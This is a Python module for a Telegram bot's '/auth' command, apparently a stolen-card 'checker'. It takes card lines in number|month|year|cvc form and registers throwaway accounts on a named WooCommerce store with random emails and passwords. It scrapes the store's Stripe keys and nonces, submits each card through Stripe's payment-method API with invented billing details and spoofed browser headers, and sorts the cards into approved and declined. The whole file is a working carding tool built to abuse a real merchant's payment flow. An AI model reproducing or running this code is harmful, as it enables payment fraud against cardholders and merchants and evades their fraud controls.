# ============================================================
#  Auth Checker v2 — Stripe Auth Gate (WooCommerce + WCPay)
#  /auth command in Telegram bot
#  Auth-only: returns Approved only for successful setup intent
# ============================================================

import requests
import re
import json
import uuid
import string
import random
import time
import os

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None

try:
    from requests_toolbelt.multipart.encoder import MultipartEncoder
except ImportError:
    MultipartEncoder = None

try:
    import brotli
except ImportError:
    brotli = None

DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
CONFIG_FILE = os.path.join(DATA_DIR, "auth_config.json")

_DEFAULT_CFG = {
    "site_url": "https://meddentalstuff.com",
}

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
]

EMAIL_DOMAINS = ['@gmail.com', '@outlook.com', '@hotmail.com', '@protonmail.com', '@icloud.com', '@yahoo.com']


def _load_cfg():
    os.makedirs(DATA_DIR, exist_ok=True)
    if not os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'w') as f:
            json.dump(_DEFAULT_CFG, f, indent=2)
        return dict(_DEFAULT_CFG)
    try:
        with open(CONFIG_FILE, 'r') as f:
            cfg = json.load(f)
        for k, v in _DEFAULT_CFG.items():
            cfg.setdefault(k, v)
        return cfg
    except Exception:
        return dict(_DEFAULT_CFG)


def _save_cfg(cfg):
    os.makedirs(DATA_DIR, exist_ok=True)
    with open(CONFIG_FILE, 'w') as f:
        json.dump(cfg, f, indent=2)


def update_config(key, value):
    cfg = _load_cfg()
    cfg[key] = value
    _save_cfg(cfg)


def get_config():
    return _load_cfg()


def _gen_email():
    patterns = [
        lambda: f"{''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 10)))}{random.randint(100, 999)}{random.choice(EMAIL_DOMAINS)}",
        lambda: f"{random.choice(['john', 'jane', 'mike', 'sarah', 'david', 'emma', 'alex'])}{random.randint(10, 999)}{random.choice(EMAIL_DOMAINS)}",
        lambda: f"user{random.randint(1000, 9999)}{random.choice(EMAIL_DOMAINS)}",
    ]
    return random.choice(patterns)()


def _gen_pass():
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    return ''.join(random.choices(chars, k=random.randint(12, 16)))


def _luhn(n):
    digits = [int(d) for d in str(n)]
    odd = digits[-1::-2]
    even = digits[-2::-2]
    total = sum(odd)
    for d in even:
        total += sum(int(x) for x in str(d * 2))
    return total % 10 == 0


def _setup_session(proxy_dict=None):
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry

    session = requests.Session()
    retry = Retry(total=3, backoff_factor=3, status_forcelist=[429, 500, 502, 503, 504],
                  allowed_methods=["HEAD", "GET", "POST", "OPTIONS"])
    adapter = HTTPAdapter(max_retries=retry, pool_connections=10, pool_maxsize=20)
    session.mount('http://', adapter)
    session.mount('https://', adapter)

    ua = random.choice(USER_AGENTS)
    session.headers.update({
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Cache-Control': 'max-age=0',
    })

    if proxy_dict:
        session.proxies.update(proxy_dict)

    return session


def check_card(cc_line, proxy_dict=None):
    start = time.time()
    cfg = _load_cfg()
    site = cfg["site_url"]

    try:
        parts = cc_line.strip().split('|')
        if len(parts) != 4:
            return "Declined | Invalid format"

        n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()

        if not n.isdigit() or len(n) not in (15, 16):
            return "Declined | Invalid card number"

        if not _luhn(n):
            return "Declined | Luhn check failed"

        if len(mm) == 1:
            mm = f'0{mm}'
        if not yy.startswith('20') and len(yy) == 2:
            yy = f'20{yy}'

        session = _setup_session(proxy_dict)

        # Step 1: Get registration page
        reg_page = session.get(f'{site}/my-account/', timeout=20)

        if BeautifulSoup:
            soup = BeautifulSoup(reg_page.text, 'html.parser')
        else:
            soup = None

        # Find registration nonce
        register_nonce = None
        nonce_selectors = [
            {'name': 'woocommerce-register-nonce'},
            {'id': 'woocommerce-register-nonce'},
            {'name': '_wpnonce'},
        ]

        if soup:
            for sel in nonce_selectors:
                tag = soup.find('input', sel)
                if tag:
                    register_nonce = tag.get('value')
                    break

        if not register_nonce:
            nonce_m = re.search(r'name="woocommerce-register-nonce"[^>]*value="([^"]+)"', reg_page.text)
            if nonce_m:
                register_nonce = nonce_m.group(1)

        if not register_nonce:
            return "Error | Registration nonce not found"

        # Generate user data
        mail = _gen_email()
        password = _gen_pass()
        first = random.choice(['John', 'Mike', 'David', 'Sarah', 'Emma', 'James', 'Lisa', 'Robert', 'Maria'])
        last = random.choice(['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis'])

        reg_data = {
            'email': mail, 'password': password, 'first_name': first, 'last_name': last,
            'woocommerce-register-nonce': register_nonce,
            '_wp_http_referer': '/my-account/', 'register': 'Register',
        }

        reg_resp = session.post(f'{site}/my-account/', data=reg_data, timeout=20)

        if 'woocommerce-error' in reg_resp.text:
            if 'already exists' in reg_resp.text.lower():
                mail = _gen_email()
                reg_data['email'] = mail
                reg_resp = session.post(f'{site}/my-account/', data=reg_data, timeout=20)
            elif 'recaptcha' in reg_resp.text.lower():
                return "Error | reCAPTCHA required"

        pay_page = session.get(f'{site}/my-account/add-payment-method/', timeout=20)

        # Extract Stripe config
        nonce, key, acc_id = None, None, None

        # Try wcpay_upe_config
        json_m = re.search(r'wcpay_upe_config\s*=\s*({.+?});', pay_page.text)
        if json_m:
            try:
                config = json.loads(json_m.group(1))
                nonce = config.get('createSetupIntentNonce')
                key = config.get('publishableKey')
                acc_id = config.get('accountId')
            except Exception:
                pass

        if not nonce:
            m = re.search(r'"createSetupIntentNonce":"([^"]+)"', pay_page.text)
            if m: nonce = m.group(1)
        if not key:
            m = re.search(r'"publishableKey":"([^"]+)"', pay_page.text)
            if m: key = m.group(1)
        if not acc_id:
            m = re.search(r'"accountId":"([^"]+)"', pay_page.text)
            if m: acc_id = m.group(1)

        if not nonce or not key:
            return "Error | Stripe config not found"

        # Step 3: Create payment method on Stripe
        sessionid = str(uuid.uuid4())
        guid_val = str(uuid.uuid4())
        muid_val = str(uuid.uuid4())
        sid_val = str(uuid.uuid4())
        top = random.randint(30000, 120000)

        stripe_data = (
            f"billing_details[name]={first} {last}&billing_details[email]={mail}"
            f"&billing_details[address][country]=US&billing_details[address][postal_code]={random.randint(10000, 99999)}"
            f"&billing_details[address][state]={random.choice(['CA', 'NY', 'TX', 'FL', 'IL', 'PA', 'OH', 'GA'])}"
            f"&billing_details[address][city]={random.choice(['Los Angeles', 'New York', 'Houston', 'Miami', 'Chicago'])}"
            f"&billing_details[address][line1]={random.randint(100, 9999)} {random.choice(['Main St', 'Broadway', 'Park Ave', 'Oak St'])}"
            f"&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}"
            f"&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F2dcfccda05%3B+stripe-js-v3%2F2dcfccda05%3B+payment-element%3B+deferred-intent"
            f"&referrer={site}&time_on_page={top}"
            f"&client_attribution_metadata[client_session_id]={sessionid}"
            f"&client_attribution_metadata[merchant_integration_source]=elements"
            f"&client_attribution_metadata[merchant_integration_subtype]=payment-element"
            f"&client_attribution_metadata[merchant_integration_version]=2021"
            f"&client_attribution_metadata[payment_intent_creation_flow]=deferred"
            f"&client_attribution_metadata[payment_method_selection_flow]=merchant_specified"
            f"&guid={guid_val}&muid={muid_val}&sid={sid_val}&key={key}"
        )

        if acc_id:
            stripe_data += f"&_stripe_account={acc_id}"

        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': random.choice(USER_AGENTS),
        }

        # Stripe API call bypasses proxy for reliability
        stripe_resp = requests.post('https://api.stripe.com/v1/payment_methods',
                                    headers=stripe_headers, data=stripe_data, timeout=20)
        stripe_json = stripe_resp.json()
        pm_id = stripe_json.get('id')

        if not pm_id:
            error = stripe_json.get('error', {})
            error_msg = error.get('message', 'Unknown error')
            error_code = error.get('code', '')
            elapsed = round(time.time() - start, 2)

            if error_code in ('incorrect_number', 'invalid_number'):
                return f"Declined | Invalid card number | {elapsed}s"
            if error_code == 'expired_card':
                return f"Declined | Card expired | {elapsed}s"
            if error_code == 'card_declined':
                return f"Declined | Card declined | {elapsed}s"
            return f"Declined | {error_msg} | {elapsed}s"

        # Step 4: Submit setup intent
        if MultipartEncoder:
            mp = MultipartEncoder({
                'action': 'create_setup_intent',
                'wcpay-payment-method': pm_id,
                '_ajax_nonce': nonce,
            })
            ajax_headers = {
                'authority': site.replace('https://', '').replace('http://', ''),
                'accept': '*/*',
                'content-type': mp.content_type,
                'origin': site,
                'referer': f'{site}/my-account/add-payment-method/',
                'user-agent': random.choice(USER_AGENTS),
                'x-requested-with': 'XMLHttpRequest',
            }
            ajax_resp = session.post(f'{site}/wp-admin/admin-ajax.php',
                                     headers=ajax_headers, data=mp, timeout=20)
        else:
            ajax_headers = {
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': site,
                'referer': f'{site}/my-account/add-payment-method/',
                'user-agent': random.choice(USER_AGENTS),
                'x-requested-with': 'XMLHttpRequest',
            }
            ajax_resp = session.post(f'{site}/wp-admin/admin-ajax.php',
                                     headers=ajax_headers,
                                     data={'action': 'create_setup_intent', 'wcpay-payment-method': pm_id, '_ajax_nonce': nonce},
                                     timeout=20)

        # Decode response (handle brotli)
        content_encoding = ajax_resp.headers.get('Content-Encoding', '')
        if content_encoding == 'br' and brotli:
            content = brotli.decompress(ajax_resp.content).decode('utf-8')
        else:
            content = ajax_resp.text

        elapsed = round(time.time() - start, 2)

        if '"success":true' in content or '"success":True' in content:
            return f"Approved | Auth Success | {elapsed}s"

        match = re.search(r'"message"\s*:\s*"([^"]+)"', content)
        msg = match.group(1) if match else "Unknown"
        return f"Declined | {msg} | {elapsed}s"

    except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
        return "ConnError | Connection failed"
    except requests.exceptions.Timeout:
        return "ConnError | Timeout"
    except Exception as e:
        return f"Error | {str(e)[:60]}"


def probe_site():
    cfg = _load_cfg()
    try:
        r = requests.get(f'{cfg["site_url"]}/my-account/', timeout=15)
        if r.status_code == 200 and ('woocommerce' in r.text.lower() or 'register' in r.text.lower()):
            return True, "WooCommerce + WCPay active"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, str(e)[:60]
